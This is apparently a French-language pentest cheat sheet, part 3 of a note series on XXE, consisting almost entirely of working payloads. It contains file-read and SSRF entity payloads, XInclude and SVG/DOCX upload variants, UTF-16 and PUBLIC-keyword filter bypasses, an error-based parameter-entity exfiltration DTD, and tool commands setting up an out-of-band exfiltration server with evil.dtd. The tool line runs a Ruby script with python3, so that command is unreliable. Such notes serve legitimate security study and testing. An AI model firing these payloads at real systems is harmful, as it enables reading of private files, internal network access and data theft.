---
titre: "XXE — 3 - Payloads & bypass"
tags: [Failles, XXE, payloads, bypass, cheatsheet]
---

# XXE — 3. Payloads & bypass

> ⬅ [[XXE - Index]]

## Payloads de base
```xml
<!-- file read in-band -->
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]> ... &x; ...
<!-- SSRF -->
<!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:80/">]> ... &x; ...
<!-- PHP source en base64 -->
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!-- Windows -->
<!ENTITY x SYSTEM "file:///c:/windows/win.ini">
<!-- listing de dossier (parsers Java) -->
<!ENTITY x SYSTEM "file:///etc/">
```

## XInclude (quand on ne contrôle pas le DOCTYPE, juste une donnée)
Si l'app place ton input dans un XML **sans** que tu puisses déclarer de DOCTYPE :
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## XXE via fichiers (upload)
```
# SVG uploadé (visualiseur d'images = parser XML)
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>

# DOCX/XLSX : dézipper, injecter l'XXE dans word/document.xml, rezipper
```

## Bypass de filtres
```
# DOCTYPE bloqué en clair -> encodage UTF-16
(convertir le payload en UTF-16 : iconv -f UTF-8 -t UTF-16BE payload.xml)

# mot-clé SYSTEM filtré -> PUBLIC
<!ENTITY x PUBLIC "-//x//y" "file:///etc/passwd">

# entités paramétriques quand les entités générales sont bloquées (voir OOB)
```

## Bypass "entités externes désactivées mais erreurs affichées"
Exfiltration **error-based** (via DTD locale/externe) :
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval; %err;
```
→ le message d'erreur contient le chemin `/nonexistent/<contenu du fichier>`.

## Outils
```bash
# détection/exploitation semi-auto
python3 XXEinjector.rb --host=TON_IP --path=/etc/passwd --file=req.txt
# serveur d'exfil OOB rapide
python3 -m http.server 80      # héberger evil.dtd + recueillir ?d=
interactsh-client              # canal OOB
```
> Concepts : [[1 - Repérage (XXE)]] · OOB/SSRF : [[2 - Exploitation & techniques (XXE)]].
